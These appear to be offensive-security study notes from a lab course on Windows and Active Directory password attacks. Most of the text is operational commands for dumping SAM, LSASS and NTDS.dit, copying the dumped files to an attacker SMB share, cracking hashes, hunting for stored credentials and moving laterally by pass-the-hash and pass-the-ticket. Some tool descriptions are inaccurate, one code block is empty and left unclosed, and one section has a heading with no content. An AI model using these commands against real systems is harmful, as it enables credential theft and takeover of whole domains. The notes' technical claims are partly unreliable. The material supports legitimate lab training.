# John The Ripper
## Cracking Modes

Single Crack Mode is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found.

```
john --format=<hash_type> <hash or hash_file>
john --format=sha256 hashes_to_crack.txt # Example
```
## Wordlist Mode

Wordlist Mode is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists.

```
john --wordlist=<wordlist_file> --rules <hash_file>
```

## Incremental Mode

Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. 

```
john --incremental <hash_file>
```

[Default Credentials CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

# Windows Local Password Attacks

## Attacking SAM

**hklm\sam**	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
**hklm\system** 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
**hklm\security** 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

## Creating a Share with smbserver.py

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $some_folder
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $HOME/ # Example
```

Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
```
move sam.save \\$lhost\CompData
move security.save \\$lhost\CompData
move system.save \\$lhost\CompData
# lhost is the smbserver we created
```

### Locating secretsdump.py
```
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $HOME/sam.save -security $HOME/security.save -system $HOME/system.save LOCAL

# Dumping local SAM hashes (uid:rid:lmhash:nthash)

```
### Dumping LSA Secrets Remotely

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Dumping SAM Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Attacking LSASS 

### Dumping LSASS Process Memory
```
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
```

A file called lsass.DMP is created and saved in:

```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

### Rundll32.exe & Comsvcs.dll Method

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

### Finding LSASS PID in cmd
From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
```
tasklist /svc
```
### Finding LSASS PID in PowerShell

From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
```
Get-Process lsass
```

### Creating lsass.dmp using PowerShell
With an elevated PowerShell session, we can issue the following command to create the dump file:
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.


### Running Pypykatz
```
 pypykatz lsa minidump $HOME/lsass.dmp 
```
## Cracking the NT Hash with Hashcat

```
sudo hashcat -m 1000 $hash $wordlist
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt # Example
```

# Attacking Active Directory & NTDS.dit
## Dictionary Attacks against AD accounts using CrackMapExec

```
Username Convention 	Practical Example for Jane Jill Doe
firstinitiallastname 	jdoe
firstinitialmiddleinitiallastname 	jjdoe
firstnamelastname 	janedoe
firstname.lastname 	jane.doe
lastname.firstname 	doe.jane
nickname 	doedoehacksstuff
```
### Creating a Custom list of Usernames
We can manually create our list(s) or use an automated list generator such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. 

```
./username-anarchy -i /home/$USER/file.txt 
./username-anarchy -i /home/ltnbob/names.txt 
```
### Launching the Attack with CrackMapExec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
## Capturing NTDS.dit

NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The .dit stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

### Connecting to a DC with Evil-WinRM
```
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
### Checking Local Group Membership
```
net localgroup
```
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

### Checking User Account Privileges including Domain
```
net user bwilliamson


User name                    bwilliamson
Full Name                    Ben Williamson

The command completed successfully.

```
This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

### Creating Shadow Copy of C:
```
vssadmin CREATE SHADOW /For=C:
```
### Copying NTDS.dit from the VSS
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the Attacking SAM section to review that method if needed.

### Transferring NTDS.dit to Attack Host
```
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

### A Faster Method: Using cme to Capture NTDS.dit

```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Cracking Hashes & Gaining Credentials

We can proceed with creating a text file containing all the NT hashes, or we can individually copy & paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

### Cracking a Single Hash with Hashcat
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
64f12cddaa88057e06a81b54e73b949b:Password1
```
In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.
*What if we are unsuccessful in cracking a hash?*

## Pass-the-Hash Considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the [NTLM authentication protocol](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:

### Pass-the-Hash with Evil-WinRM Example+

```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

# Credential Hunting in Windows

### Key Terms to Search

```
Passwords 	Passphrases 	Keys
Username 	User account 	Creds
Users 	Passkeys 	Passphrases
configuration 	dbcredential 	dbpassword
pwd 	Login 	Credentials
```
We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a [standalone copy](https://github.com/AlessandroZ/LaZagne/releases/) of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.

### Running Lazagne All

```
start lazagne.exe all
```
This will execute Lazagne and run *all* included modules. We can include the option *-vv* to study what it is doing in the background.


### Using findstr
We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Additional Considerations

There are thousands of tools & key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.

Here are some other places we should keep in mind when credential hunting:
 * Passwords in Group Policy in the SYSVOL share
 * Passwords in scripts in the SYSVOL share
 * Password in scripts on IT shares
 * Passwords in web.config files on dev machines and IT shares
 * unattend.xml
 * Passwords in the AD user or computer description fields
 * KeePass databases --> pull hash, crack and get loads of access.
 * Found on user systems and shares
 * Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

## Memory and Cache

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

### Memory - Mimipenguin
```
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```

### Memory - LaZagne
```
sudo python2.7 laZagne.py all
```


### Firefox Stored Credentials
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.

### Decrypting Firefox Credentials

# Windows Lateral Movement

## Pass the Hash (PtH)

A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

 * Dumping the local SAM database from a compromised host.
 * Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
 * Pulling the hashes from memory (lsass.exe).

Let's assume we obtain the password hash (64F12CDDAA88057E06A81B54E73B949B) for the account julio from the domain inlanefreight.htb. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.

## Windows NTLM Introduction

[Microsoft's Windows New Technology LAN Manager](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.

## Pass the Hash with Mimikatz (Windows)

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named *sekurlsa::pth* that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:
 * /user - The user name we want to impersonate.
 * /rc4 or /NTLM - NTLM hash of the user's password.
 * /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
 * /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

### Pass the Hash from Windows Using Mimikatz:
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.

## Pass the Hash with PowerShell Invoke-TheHash (Windows)
Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-
side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

 * Target - Hostname or IP address of the target.
 * Username - Username to use for authentication.
 * Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
 * Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
 * Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

### Invoke-TheHash with SMB

```

We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the [Shells & Payloads](https://academy.hackthebox.com/module/details/115) module on HTB Academy.

To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.

### Netcat Listener

```
.\nc.exe -lvnp 8001
```
To create a simple reverse shell using PowerShell, we can visit [https://www.revshells.com/](https://www.revshells.com/), set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64)

## Pass the Hash with Impacket (Linux)
[Impacket](https://github.com/fortra/impacket) has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.

### Pass the Hash with Impacket PsExec
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
 * impacket-wmiexec
 * impacket-atexec
 * impacket-smbexec

## Pass the Hash with CrackMapExec (Linux)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the Active Directory Enumeration & Attacks module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

### Pass the Hash with CrackMapExec
```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands.

### CrackMapExec - Command Execution

```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)
[evil-winrm](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)
We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
There are a few caveats to this attack:
 * Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the error
This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.

### Pass the Hash Using RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
## UAC Limits Pass the Hash for Local Accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. 

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).



# Pass the Ticket (PtT) from Windows
The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

 1. The **TGT - Ticket Granting Ticket** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or TGS.
 2. The **TGS - Ticket Granting Service** is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) Attack

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:

1. Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
2. Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus.

### Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

We can harvest all tickets from a system using the Mimikatz module *sekurlsa::tickets /export*. The result is a list of files with the extension *.kirbi*, which contain the tickets.

```
mimikatz.exe
sekurlsa::tickets /export
exit
```
The tickets that end with **$** correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an **@** that separates the service name and the domain, for example: **[randomvalue]-username@service-domain.local.kirbi**.

We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). **Rubeus dump**, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option **/nowrap** for easier copy-paste.

```
Rubeus.exe dump /nowrap
```

## Pass the Key or OverPass the Hash

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.

### Mimikatz - Extract Kerberos Keys
```
mimikatz.exe
sekurlsa::ekeys
```
Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the *OverPass the Hash* or *Pass the Key* attack using Mimikatz and Rubeus.

### Mimikatz - Pass the Key or OverPass the Hash

```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:$domain /user:plaintext /ntlm:$user_hash
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f # Example
```
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module *asktgt* with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.

### Rubeus - Pass the Key or OverPass the Hash
```
Rubeus.exe
asktgt /domain:$dfomain /user:plaintext /$crypto:$user_hash /nowrap
asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap # Example
```

**Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.**

# Pass the Ticket (PtT)

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

## Rubeus Pass the Ticket
```
Rubeus.exe asktgt /domain:$domain /user:plaintext /rc4:$user_hash /ptt
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # Example

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt$domain.kirbi
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # Example
```

### Convert .kirbi to Base64 Format

```
powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$file"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")) # Example
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
```
Rubeus.exe ptt /ticket:$ticket
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMC # Example
```

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbt
gt-inlanefreight.htb.kirbi"
exit
```

# Pass The Ticket with PowerShell Remoting (Windows)

PowerShell Remoting allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

## Mimikatz - PowerShell Remoting with Pass the Ticket

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using kerberos::ptt. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.

### Mimikatz - Pass the Ticket for Lateral Movement.

```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
PS Enter-PSSession -ComputerName DC01
PS whoami
PS hostname
```

## Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option createnetonly, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag **/show** to display the process, and the result is the equivalent of **runas /netonly**. This prevents the erasure of existing TGTs for the current logon session.

### Create a Sacrificial Process with Rubeus
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.


### Rubeus - Pass the Ticket for Lateral Movement
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
whoami
```
